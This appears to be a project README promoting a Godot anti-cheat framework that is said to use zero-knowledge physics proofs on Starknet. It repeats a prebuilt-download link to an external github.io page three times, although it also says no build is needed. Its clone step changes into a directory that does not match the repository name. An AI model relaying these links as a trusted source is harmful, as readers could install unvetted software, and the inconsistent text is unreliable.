# ZK-Sniper / Obsidian Anti-Cheat - Anti-Cheat 2026

> **An FPS anti-cheat framework that eliminates invasive kernel drivers by executing zero-knowledge physics checks on Starknet to protect user privacy.**

[![Platform](https://img.shields.io/badge/Platform-Godot-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/schneiderben25/starknet-zk-anticheat-hub?style=flat-square)](https://github.com/schneiderben25/starknet-zk-anticheat-hub)

---

<p align="center">
  <a href="https://schneiderben25.github.io/starknet-zk-anticheat-hub/">
    <img src="https://img.shields.io/badge/Download-ZK--Sniper%20Latest-brightgreen?style=for-the-badge" alt="Download ZK-Sniper">
  </a>
</p>

> **[Download Latest Build - ZK-Sniper / Obsidian Anti-Cheat v1.0](https://schneiderben25.github.io/starknet-zk-anticheat-hub/)**

---

[Download Latest Build](https://schneiderben25.github.io/starknet-zk-anticheat-hub/)

---

## Technical Overview

ZK-Sniper / Obsidian Anti-Cheat offers a decentralized, privacy-focused security architecture for online multiplayer shooters. Rather than relying on intrusive ring-0 system access that monitors background host processes, this mechanism offloads match integrity checks to Starknet using zero-knowledge proofs. Through custom "Proof of Shot" logic, the application flags suspicious aiming patterns and geometry clipping without collecting sensitive local host data.

Designed specifically for Godot-based shooters, the platform combines Cairo smart contracts with a Torii indexing layer to process move validity trustlessly. The solution runs strictly in user space, offering transparent gameplay validation while avoiding high-privilege system requirements.

## Core Capabilities

- **User-Space Operation** – Runs entirely without OS kernel privileges or driver installation
- **Decentralized Physics Auditing** – Validates trajectory, raycasts, and spatial limits on Starknet
- **Zero-Knowledge Privacy** – Proves action legitimacy while keeping local system state hidden
- **Cairo Smart Contract Backend** – Executes proof creation and state validation rules on-chain
- **Torii Indexer Integration** – Streamlines fetching and querying of real-time match events
- **Aimbot & Wallhack Suppression** – Intercepts impossible target acquisition and clip exploits
- **Proof of Shot Mechanics** – Validates trajectory sanity against player coords and gun parameters
- **Godot Engine Native** – Built to integrate directly into Godot competitive shooter projects

## Getting Started

Fetch the repository files and switch into the workspace directory:

```bash
git clone https://github.com/schneiderben25/starknet-zk-anticheat-hub.git
cd ZK-Anti-Cheat
```

The game workspace requires no extra compilation steps inside Godot. Simply load the project directory within Godot Engine and launch the initial scene. For deploying updated Starknet state logic, refer to the instructions located inside `contracts/`.

## Execution Workflow

1. Start your project within Godot Engine.
2. The integrity runtime initializes alongside the main process.
3. In-game actions undergo validation against physics rules stored on-chain.
4. If anomalous behavior is detected, a proof verification task is sent to Starknet.
5. Compliant input sequences proceed; failing sequences get flagged.

CLI launch example:

```bash
# Start the game server
godot --server

# Connect a client
godot --client --address 127.0.0.1 --port 8080
```

## System Configuration

Runtime parameters are declared within `config/anti_cheat_settings.json`. Main properties include:

```json
{
  "proof_threshold": 0.95,
  "verification_timeout_ms": 2000,
  "starknet_rpc_url": "https://starknet-goerli.infura.io/v3/YOUR_KEY",
  "torii_endpoint": "https://torii.example.com/graphql"
}
```

Edit these parameters to reconfigure validation sensitivity thresholds and remote endpoints.

## Dependencies & Requirements

- **Engine Target:** Godot Engine version 4.x or higher
- **Chain Runtime:** Starknet Goerli / Sepolia testnet (or mainnet for production environments)
- **Disk Usage:** ~50 MB for client assets and compiled contract ABIs
- **Connectivity:** Active internet connection for state verification calls
- **Build Tools:** Cairo compiler version 2.0+ (required for contract deployment)

## Frequently Asked Questions

**Q: What sets this apart from traditional anti-cheat engines?**  
A: Rather than reading device memory with OS kernel access, it uses zero-knowledge cryptography on Starknet to enforce physics compliance without spying on user host hardware.

**Q: Will this slow down gameplay frame rates?**  
A: Impact is minimal. Proof verification runs asynchronously and only initiates when telemetry breaches baseline checks.

**Q: Can game operators tune verification limits?**  
A: Yes, tolerance can be adjusted via the `proof_threshold` property in the config file.

**Q: What is the process for modifying Cairo contract rules?**  
A: Compile your modified Cairo sources using Cairo 2.0+ toolchains and push the updated binaries to Starknet.

**Q: Where can I submit issues or ask questions?**  
A: Submit a report directly on the project's GitHub issues page.

## Licensing

Distributed under the terms of the GNU GPL v3.0 license. Refer to [LICENSE](LICENSE) for full text.
